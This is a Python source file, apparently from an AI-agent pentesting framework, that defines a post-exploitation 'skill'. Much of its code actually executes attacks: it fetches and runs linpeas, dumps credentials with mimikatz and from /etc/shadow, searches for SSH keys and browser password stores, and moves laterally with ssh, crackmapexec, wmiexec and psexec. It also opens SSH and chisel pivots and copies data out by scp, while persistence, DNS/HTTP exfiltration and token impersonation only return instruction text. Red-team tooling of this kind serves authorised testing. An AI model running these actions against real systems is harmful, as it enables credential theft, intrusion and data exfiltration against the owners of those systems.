"""PostEx - Post Exploitation Skill."""

import asyncio
import os
import shutil
import time
from typing import Any

import structlog

from t100ai.skills.base import BaseSkill, RiskLevel, SkillResult

logger = structlog.get_logger()


class PostExSkill(BaseSkill):
    """Skill de post-explotación — privilege escalation, credential dumping, lateral movement."""

    name = "postex"
    description = "Post-exploitation techniques"
    category = "postex"
    risk_level = RiskLevel.INTRUSIVE

    def __init__(self):
        super().__init__()
        self.tools = [
            "postex.priv_esc",
            "postex.credential_dump",
            "postex.lateral_movement",
            "postex.persistence",
            "postex.pivoting",
            "postex.data_exfil",
            "postex.cleanup",
        ]

    def get_available_actions(self) -> list[str]:
        """Return list of available post-ex actions."""
        return [
            "priv_esc",
            "credential_dump",
            "lateral_movement",
            "persistence",
            "pivoting",
            "data_exfil",
            "cleanup",
            "linpeas",
            "winpeas",
            "mimikatz",
            "hash_dump",
            "ssh_keys",
            "browser_creds",
            "token_impersonation",
        ]

    async def validate_params(self, action: str, params: dict[str, Any]) -> bool:
        """Validate parameters for a given post-ex action."""
        if action in ("lateral_movement", "pivoting", "data_exfil"):
            return "target" in params
        if action == "priv_esc":
            return "os" in params
        return True

    async def execute(self, action: str, params: dict[str, Any]) -> "SkillResult":
        """Execute a post-ex action with given parameters."""
        start_time = time.time()

        match action:
            case "priv_esc":
                return await self._priv_esc(params, start_time)
            case "credential_dump":
                return await self._credential_dump(params, start_time)
            case "lateral_movement":
                return await self._lateral_movement(params, start_time)
            case "persistence":
                return await self._persistence(params, start_time)
            case "pivoting":
                return await self._pivoting(params, start_time)
            case "data_exfil":
                return await self._data_exfil(params, start_time)
            case "cleanup":
                return await self._cleanup(params, start_time)
            case "linpeas":
                return await self._linpeas(params, start_time)
            case "winpeas":
                return await self._winpeas(params, start_time)
            case "mimikatz":
                return await self._mimikatz(params, start_time)
            case "hash_dump":
                return await self._hash_dump(params, start_time)
            case "ssh_keys":
                return await self._ssh_keys(params, start_time)
            case "browser_creds":
                return await self._browser_creds(params, start_time)
            case "token_impersonation":
                return await self._token_impersonation(params, start_time)
            case _:
                return SkillResult(success=False, error=f"Acción desconocida: {action}")

    # ── Privilege Escalation ──────────────────────────────────────────────

    async def _priv_esc(self, params: dict, start: float) -> SkillResult:
        os_type = params.get("os", "linux").lower()
        if os_type in ("linux", "unix"):
            return await self._linpeas(params, start)
        elif os_type in ("windows", "win"):
            return await self._winpeas(params, start)
        return SkillResult(
            success=False,
            error=f"OS no soportado: {os_type}. Use 'linux' o 'windows'.",
            execution_time=time.time() - start,
        )

    async def _linpeas(self, params: dict, start: float) -> SkillResult:
        """Ejecuta linpeas para enumeración de escalada de privilegios Linux."""
        linpeas_path = params.get("linpeas_path", "/tmp/linpeas.sh")
        if os.path.exists(linpeas_path):
            cmd = ["bash", linpeas_path, "-a"]
            return await self._run_postex_tool(cmd, "linpeas", start, params)

        # Try downloading if not present
        if shutil.which("curl"):
            dl_cmd = ["curl", "-sL", "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh", "-o", linpeas_path]
            try:
                proc = await asyncio.create_subprocess_exec(*dl_cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                await proc.communicate()
                if proc.returncode == 0 and os.path.exists(linpeas_path):
                    os.chmod(linpeas_path, 0o755)
                    return await self._linpeas(params, start)
            except Exception:
                pass

        return SkillResult(
            success=False,
            error="linpeas.sh no encontrado y no se pudo descargar",
            execution_time=time.time() - start,
        )

    async def _winpeas(self, params: dict, start: float) -> SkillResult:
        """Ejecuta winpeas para enumeración de escalada de privilegios Windows."""
        winpeas_path = params.get("winpeas_path", "winPEASx64.exe")
        if os.path.exists(winpeas_path):
            cmd = [winpeas_path, "cmd", "systeminfo", "userinfo", "procperms"]
            return await self._run_postex_tool(cmd, "winpeas", start, params)

        return SkillResult(
            success=False,
            error="winpeas no encontrado",
            execution_time=time.time() - start,
        )

    # ── Credential Dumping ────────────────────────────────────────────────

    async def _credential_dump(self, params: dict, start: float) -> SkillResult:
        os_type = params.get("os", "linux").lower()
        if os_type in ("windows", "win"):
            return await self._mimikatz(params, start)
        return await self._hash_dump(params, start)

    async def _mimikatz(self, params: dict, start: float) -> SkillResult:
        """Ejecuta mimikatz para extracción de credenciales Windows."""
        commands = params.get("commands", "sekurlsa::logonPasswords exit")
        cmd = ["mimikatz", "privilege::debug", commands]
        return await self._run_postex_tool(cmd, "mimikatz", start, params)

    async def _hash_dump(self, params: dict, start: float) -> SkillResult:
        """Dumps hashes from /etc/shadow o SAM."""
        findings = []
        output_parts = []

        # Try reading /etc/shadow (needs root)
        try:
            proc = await asyncio.create_subprocess_exec(
                "cat", "/etc/shadow",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()
            if proc.returncode == 0:
                for line in stdout.decode(errors="replace").splitlines():
                    if ":" in line:
                        user, hash_val = line.split(":", 1)
                        if hash_val and hash_val not in ("*", "!", "!!", ""):
                            findings.append({
                                "type": "password_hash",
                                "user": user,
                                "hash_type": "shadow",
                                "severity": "CRIT",
                            })
                output_parts.append(stdout.decode(errors="replace"))
        except Exception:
            pass

        # Try unshadow for John
        try:
            proc = await asyncio.create_subprocess_exec(
                "cat", "/etc/passwd",
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, _ = await proc.communicate()
            if proc.returncode == 0:
                output_parts.append("\n--- /etc/passwd ---\n" + stdout.decode(errors="replace"))
        except Exception:
            pass

        return SkillResult(
            success=len(findings) > 0,
            output="\n".join(output_parts) if output_parts else "No se pudieron extraer hashes (se requieren privilegios de root)",
            findings=findings if findings else [{"type": "hash_dump", "value": "No se pudieron extraer hashes", "severity": "INFO"}],
            execution_time=time.time() - start,
        )

    # ── Lateral Movement ──────────────────────────────────────────────────

    async def _lateral_movement(self, params: dict, start: float) -> SkillResult:
        target = params["target"]
        method = params.get("method", "ssh")
        user = params.get("user", "root")
        password = params.get("password", "")
        key = params.get("key", "")

        match method:
            case "ssh":
                cmd_parts = ["ssh", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5"]
                if key:
                    cmd_parts += ["-i", key]
                cmd_parts += [f"{user}@{target}", "whoami && hostname"]
                return await self._run_postex_tool(cmd_parts, "lateral_ssh", start, params)
            case "smb":
                if shutil.which("crackmapexec"):
                    cmd = ["crackmapexec", "smb", target]
                    if user and password:
                        cmd += ["-u", user, "-p", password]
                    elif user and key:
                        cmd += ["-u", user, "-H", key]
                    return await self._run_postex_tool(cmd, "lateral_smb", start, params)
                return SkillResult(success=False, error="crackmapexec no instalado", execution_time=time.time() - start)
            case "wmi":
                if shutil.which("wmiexec.py"):
                    cmd = ["wmiexec.py", f"{user}:{password}@{target}"]
                    return await self._run_postex_tool(cmd, "lateral_wmi", start, params)
                return SkillResult(success=False, error="wmiexec.py (impacket) no instalado", execution_time=time.time() - start)
            case "psexec":
                if shutil.which("psexec.py"):
                    cmd = ["psexec.py", f"{user}:{password}@{target}"]
                    return await self._run_postex_tool(cmd, "lateral_psexec", start, params)
                return SkillResult(success=False, error="psexec.py (impacket) no instalado", execution_time=time.time() - start)
            case _:
                return SkillResult(success=False, error=f"Metodo no soportado: {method}", execution_time=time.time() - start)

    # ── Persistence ───────────────────────────────────────────────────────

    async def _persistence(self, params: dict, start: float) -> SkillResult:
        method = params.get("method", "cron")
        payload = params.get("payload", "")

        if not payload:
            return SkillResult(success=False, error="Payload requerido", execution_time=time.time() - start)

        match method:
            case "cron":
                cron_entry = f"* * * * * {payload}"
                findings = [{"type": "persistence_cron", "entry": cron_entry, "severity": "HIGH"}]
                return SkillResult(
                    success=True,
                    output=f"Persistence via cron:\n{cron_entry}",
                    findings=findings,
                    execution_time=time.time() - start,
                )
            case "ssh_key":
                key_path = params.get("key_path", "~/.ssh/authorized_keys")
                findings = [{"type": "persistence_ssh_key", "path": key_path, "severity": "HIGH"}]
                return SkillResult(
                    success=True,
                    output=f"SSH key persistence: {key_path}\nKey: {payload}",
                    findings=findings,
                    execution_time=time.time() - start,
                )
            case "service":
                service_name = params.get("service_name", "specter_svc")
                findings = [{"type": "persistence_service", "name": service_name, "severity": "HIGH"}]
                return SkillResult(
                    success=True,
                    output=f"Service persistence: {service_name}\nExec: {payload}",
                    findings=findings,
                    execution_time=time.time() - start,
                )
            case _:
                return SkillResult(success=False, error=f"Metodo no soportado: {method}", execution_time=time.time() - start)

    # ── Pivoting ──────────────────────────────────────────────────────────

    async def _pivoting(self, params: dict, start: float) -> SkillResult:
        target = params["target"]
        method = params.get("method", "ssh")

        match method:
            case "ssh":
                local_port = params.get("local_port", "8080")
                remote_port = params.get("remote_port", "8080")
                remote_host = params.get("remote_host", "127.0.0.1")
                cmd = ["ssh", "-f", "-N", "-L", f"{local_port}:{remote_host}:{remote_port}", target]
                return await self._run_postex_tool(cmd, "pivot_ssh", start, params)
            case "chisel":
                port = params.get("port", "8080")
                if shutil.which("chisel"):
                    cmd = ["chisel", "client", target, f"R:{port}"]
                    return await self._run_postex_tool(cmd, "pivot_chisel", start, params)
                return SkillResult(success=False, error="chisel no instalado", execution_time=time.time() - start)
            case "proxychains":
                proxy = params.get("proxy", "socks5://127.0.0.1:1080")
                findings = [{"type": "pivot_proxychains", "proxy": proxy, "target": target, "severity": "INFO"}]
                return SkillResult(
                    success=True,
                    output=f"Proxychains config: {proxy}\nUsage: proxychains <command> {target}",
                    findings=findings,
                    execution_time=time.time() - start,
                )
            case _:
                return SkillResult(success=False, error=f"Metodo no soportado: {method}", execution_time=time.time() - start)

    # ── Data Exfiltration ─────────────────────────────────────────────────

    async def _data_exfil(self, params: dict, start: float) -> SkillResult:
        target = params["target"]
        data_path = params.get("data_path", "/tmp/exfil.tar.gz")
        method = params.get("method", "scp")

        match method:
            case "scp":
                cmd = ["scp", "-o", "StrictHostKeyChecking=no", data_path, target]
                return await self._run_postex_tool(cmd, "exfil_scp", start, params)
            case "dns":
                findings = [{"type": "exfil_dns", "target": target, "method": "dns_tunnel", "severity": "HIGH"}]
                return SkillResult(
                    success=True,
                    output=f"DNS exfil: encode data as subdomains of {target}",
                    findings=findings,
                    execution_time=time.time() - start,
                )
            case "http":
                findings = [{"type": "exfil_http", "target": target, "method": "http_post", "severity": "HIGH"}]
                return SkillResult(
                    success=True,
                    output=f"HTTP exfil: POST data to {target}/upload",
                    findings=findings,
                    execution_time=time.time() - start,
                )
            case _:
                return SkillResult(success=False, error=f"Metodo no soportado: {method}", execution_time=time.time() - start)

    # ── Cleanup ───────────────────────────────────────────────────────────

    async def _cleanup(self, params: dict, start: float) -> SkillResult:
        actions = params.get("actions", ["logs"])
        findings = []
        output_parts = []

        if "logs" in actions:
            findings.append({"type": "cleanup", "action": "log_clear", "severity": "INFO"})
            output_parts.append("[*] Log cleanup recommended (manual)")

        if "tools" in actions:
            tools_to_remove = params.get("tools", [])
            for tool in tools_to_remove:
                findings.append({"type": "cleanup", "action": f"remove_{tool}", "severity": "INFO"})
                output_parts.append(f"[*] Remove {tool} from target")

        if "history" in actions:
            findings.append({"type": "cleanup", "action": "history_clear", "severity": "INFO"})
            output_parts.append("[*] Shell history cleanup recommended (manual)")

        return SkillResult(
            success=True,
            output="\n".join(output_parts) if output_parts else "No cleanup actions specified",
            findings=findings if findings else [{"type": "cleanup", "value": "No actions", "severity": "INFO"}],
            execution_time=time.time() - start,
        )

    # ── SSH Keys ──────────────────────────────────────────────────────────

    async def _ssh_keys(self, params: dict, start: float) -> SkillResult:
        """Busca claves SSH en el sistema."""
        findings = []
        output_parts = []

        search_paths = ["~/.ssh", "/root/.ssh", "/home/*/.ssh"]
        for path in search_paths:
            try:
                proc = await asyncio.create_subprocess_exec(
                    "find", path, "-name", "*.pub", "-o", "-name", "id_*", "-o", "-name", "authorized_keys",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate()
                if stdout:
                    for line in stdout.decode(errors="replace").splitlines():
                        findings.append({"type": "ssh_key", "path": line.strip(), "severity": "HIGH"})
                    output_parts.append(stdout.decode(errors="replace"))
            except Exception:
                pass

        return SkillResult(
            success=len(findings) > 0,
            output="\n".join(output_parts) if output_parts else "No se encontraron claves SSH",
            findings=findings if findings else [{"type": "ssh_key", "value": "No keys found", "severity": "INFO"}],
            execution_time=time.time() - start,
        )

    # ── Browser Credentials ───────────────────────────────────────────────

    async def _browser_creds(self, params: dict, start: float) -> SkillResult:
        """Busca credenciales de navegadores."""
        findings = []
        output_parts = []

        browser_paths = {
            "chrome": "~/.config/google-chrome/Default/Login Data",
            "firefox": "~/.mozilla/firefox/*.default*/logins.json",
        }

        for browser, path in browser_paths.items():
            try:
                proc = await asyncio.create_subprocess_exec(
                    "find", os.path.expanduser(path.rsplit("*", 1)[0]),
                    "-name", path.rsplit("/", 1)[-1] if "*" not in path else "logins.json",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE,
                )
                stdout, _ = await proc.communicate()
                if stdout:
                    for line in stdout.decode(errors="replace").splitlines():
                        findings.append({"type": "browser_creds", "browser": browser, "path": line.strip(), "severity": "HIGH"})
                    output_parts.append(f"[{browser}] {stdout.decode(errors='replace').strip()}")
            except Exception:
                pass

        return SkillResult(
            success=len(findings) > 0,
            output="\n".join(output_parts) if output_parts else "No se encontraron credenciales de navegador",
            findings=findings if findings else [{"type": "browser_creds", "value": "No creds found", "severity": "INFO"}],
            execution_time=time.time() - start,
        )

    # ── Token Impersonation ───────────────────────────────────────────────

    async def _token_impersonation(self, params: dict, start: float) -> SkillResult:
        """Impersonación de tokens (Windows - requires meterpreter/incognito)."""
        token = params.get("token", "")
        pid = params.get("pid", "")

        findings = []
        if token:
            findings.append({"type": "token_impersonation", "token": token, "severity": "CRIT"})
        if pid:
            findings.append({"type": "token_steal", "pid": pid, "severity": "CRIT"})

        output = f"Token impersonation: token={token or 'N/A'}, pid={pid or 'N/A'}"
        output += "\nUse meterpreter: impersonate_token or steal_token -p <PID>"

        return SkillResult(
            success=True,
            output=output,
            findings=findings if findings else [{"type": "token_impersonation", "value": "No token specified", "severity": "INFO"}],
            execution_time=time.time() - start,
        )

    # ── Helper ────────────────────────────────────────────────────────────

    async def _run_postex_tool(
        self, cmd: list[str], action: str, start: float, params: dict
    ) -> SkillResult:
        """Ejecuta una herramienta de post-explotación de forma async."""
        logger.info("Running postex tool", tool=cmd[0], action=action, target=params.get("target"))

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await proc.communicate()
            output = stdout.decode(errors="replace") + stderr.decode(errors="replace")

            findings = self._parse_postex_output(output, action, params)

            return SkillResult(
                success=proc.returncode == 0,
                output=output,
                findings=findings,
                execution_time=time.time() - start,
            )
        except FileNotFoundError:
            return SkillResult(
                success=False,
                error=f"{cmd[0]} no instalado",
                execution_time=time.time() - start,
            )
        except Exception as e:
            return SkillResult(
                success=False,
                error=str(e),
                execution_time=time.time() - start,
            )

    def _parse_postex_output(self, output: str, action: str, params: dict[str, Any]) -> list[dict[str, Any]]:
        """Parsea output de herramientas de post-explotación."""
        findings = []

        if action in ("linpeas", "winpeas"):
            severity_keywords = {"CRIT": ["root", "Administrator", "SYSTEM", "NT AUTHORITY"],
                                 "HIGH": ["sudo", "password", "SUID", "writable", "private key"],
                                 "MED": ["cron", "capability", "docker", "lxd"]}
            for line in output.splitlines():
                for sev, keywords in severity_keywords.items():
                    if any(kw.lower() in line.lower() for kw in keywords):
                        findings.append({"type": "priv_esc_finding", "value": line.strip(), "severity": sev})
                        break

        elif action in ("lateral_ssh", "lateral_smb", "lateral_wmi", "lateral_psexec"):
            if "whoami" in output.lower() or "hostname" in output.lower():
                findings.append({"type": "lateral_success", "target": params.get("target", ""), "severity": "CRIT"})
            if "Access Denied" in output or "access denied" in output:
                findings.append({"type": "lateral_denied", "target": params.get("target", ""), "severity": "INFO"})

        elif action == "mimikatz":
            for line in output.splitlines():
                if "Username" in line or "NTLM" in line or "Password" in line:
                    findings.append({"type": "credential", "value": line.strip(), "severity": "CRIT"})

        elif action == "pivot_ssh":
            findings.append({"type": "pivot_established", "target": params.get("target", ""), "severity": "INFO"})

        return findings if findings else [{"type": action, "value": "No findings extracted", "severity": "INFO"}]
